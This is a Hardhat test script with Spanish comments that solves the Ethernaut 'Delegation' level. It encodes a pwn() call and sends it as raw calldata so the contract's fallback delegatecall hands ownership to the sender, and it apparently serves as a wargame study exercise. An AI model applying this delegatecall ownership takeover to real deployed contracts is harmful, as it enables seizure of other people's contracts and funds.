import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract;
const LEVEL_ADDRESS = "0x9451961b7Aea1Df57bc20CC68D72f662241b5493";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  //Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`Delegation`);
  const challengeAddress = await createChallenge(
    LEVEL_ADDRESS
  );
  challenge = challengeFactory.attach(challengeAddress);
});

describe("Delegation Challenge", async () => {
  it("Resuelve el challenge - Delegation", async () => {
    //Encodear función pwn para enviar en msg.data a utilizar en fallback.
    const iface = new Interface(["function pwn()"]);
    const data = iface.encodeFunctionData(`pwn`, []);

    //Enviar transacción para ser tomada por fallback. Uso sendTransaction para enviar cualquier verdura (sería la sección "CALLDATA" en Remix que aparee abajo de todas las funciones de un contrato).
    let txParaFallback = await eoa.sendTransaction({
      from: await eoa.getAddress(),
      to: challenge.address,
      data,
      gasLimit: 1e5
    });
    await txParaFallback.wait();
  });
});

after(async ()=> {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});

// Delegatecall> https://docs.soliditylang.org/en/v0.8.12/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries
//Importante para ver encodeo de data para método delegatecall: https://docs.ethers.io/v5/api/utils/abi/interface/#Interface--encoding
